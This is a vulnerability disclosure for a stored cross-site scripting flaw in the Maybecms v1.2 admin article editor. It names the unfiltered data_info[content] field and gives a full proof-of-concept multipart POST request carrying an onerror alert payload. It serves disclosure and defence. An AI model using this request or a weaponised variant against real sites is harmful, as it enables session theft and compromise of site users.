# Maybecms Backend Stored XSS Vulnerability
## 1. Download Link
https://zdown.chinaz.com/201501/Maybecms_v1.2.rar

## 2. Impact of the Vulnerability
An attacker can exploit this vulnerability to steal sensitive user information, such as session cookies, login credentials, or personal data. Additionally, the attacker can use this vulnerability to perform other malicious actions, such as redirecting users to phishing pages, delivering malware payloads, or implanting malicious programs.

## 3. Affected Version
Maybecms v1.2

## 4. Vulnerability Description
A stored XSS vulnerability exists in the web application management backend of Maybecms. The vulnerability is located in the "Content - Article Management - Add Article - Article Body" section. By injecting XSS code into the article body and saving the article, clicking the "View" button triggers a browser pop-up, confirming the presence of the XSS vulnerability.
<img width="1208" alt="image" src="https://github.com/user-attachments/assets/6829cdbb-6660-4e44-89b7-8c54ec3ead9f" />
<img width="1197" alt="image" src="https://github.com/user-attachments/assets/4af9ad8a-2925-47e8-9843-edb4019787a2" />
<img width="1210" alt="image" src="https://github.com/user-attachments/assets/3d37639a-4bb5-474b-a923-e1a2a1ae368d" />
## 5.Vulnerability Analysis
In the file /maybecms/runtime/maybecms_admin_view/default,article_index.htm.php, the data_info[content] field does not perform regular filtering on the input parameters. The backend fails to filter or escape HTML tags in the user-submitted data_info[content], allowing users to directly submit content containing dangerous attributes such as <script> and onerror. By adding malicious XSS statements to the parameters in the request, the vulnerability can be successfully exploited.
<img width="1213" alt="image" src="https://github.com/user-attachments/assets/5495e940-5384-4ff3-9f45-d669e229974d" />

## 6.Vulnerability Verification Process
```
POST /cve/mb/admin/index.php?u=article-edit HTTP/1.1
Host: 10.211.55.3
Content-Length: 1697
Cache-Control: max-age=0
Origin: http://10.211.55.3
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryq8YkI3rYLBOnHPic
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.211.55.3/cve/mb/admin/index.php?u=article-edit-cid-1-id-1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=v6ejje8o7oa60asvcmmljvdrf5
Connection: close

------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[pic]"


------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[iscomment]"

0
------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[author]"

admin
------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[source]"


------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[listorder]"

0
------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="views"

1
------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[alias]"


------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[id]"

1
------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="cid"

1
------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[title]"

2222222222
------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[tags]"


------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[intro]"

12222
------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[seo_title]"


------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[seo_keywords]"


------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="info[flags]"

0
------WebKitFormBoundaryq8YkI3rYLBOnHPic
Content-Disposition: form-data; name="data_info[content]"

<p>3333333<img src=1 onerror=alert(/xss/)>33333</p>
------WebKitFormBoundaryq8YkI3rYLBOnHPic--
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/16c25462-d3d6-427b-9aac-facd52e04e80" />
